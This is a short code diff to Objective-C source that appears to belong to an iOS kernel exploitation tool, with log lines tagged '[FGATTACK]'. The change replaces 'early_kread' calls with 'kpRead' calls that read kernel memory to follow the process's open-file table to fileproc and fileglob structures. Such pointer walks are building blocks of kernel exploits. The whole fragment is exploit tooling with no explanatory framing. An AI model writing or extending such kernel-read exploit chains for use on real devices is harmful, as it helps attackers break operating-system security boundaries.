@@ -1,3 +1,4 @@
+#import <sys/stat.h>
 #import "KPDump.h"
 #import "KPLog.h"
 
@@ -2486,13 +2487,13 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                 kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] rootZVA=%#llx hosts fd=%d", (unsigned long long)rootZVA, tfd]);
                 uint64_t fpRaw = 0, globRaw = 0, fdOf = 0;
                 if (tfd >= 0 && rootZVA && selfProc) {
-                    early_kread(selfProc + 0xF8, &fdOf, 8, "fd_ofiles");
+                    kpRead(selfProc + 0xF8, &fdOf, 8, "fd_ofiles", r);
                     uint64_t ofiles = kp_untag_ptr(fdOf);
                     if (kpLooksLikeKernelPointer(ofiles))
-                        early_kread(ofiles + (uint64_t)tfd * 8, &fpRaw, 8, "ofiles[fd]");
+                        kpRead(ofiles + (uint64_t)tfd * 8, &fpRaw, 8, "ofiles[fd]", r);
                     uint64_t fp = kp_untag_ptr(fpRaw);
                     if (kpLooksLikeKernelPointer(fp))
-                        early_kread(fp + off_fileproc_fp_glob, &globRaw, 8, "fileproc.glob");
+                        kpRead(fp + off_fileproc_fp_glob, &globRaw, 8, "fileproc.glob", r);
                     uint64_t glob = kp_untag_ptr(globRaw);
                     kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fileproc=%#llx fileglob=%#llx", (unsigned long long)fp, (unsigned long long)glob]);
                     uint32_t fgOff = 0xFFFFFFFF;
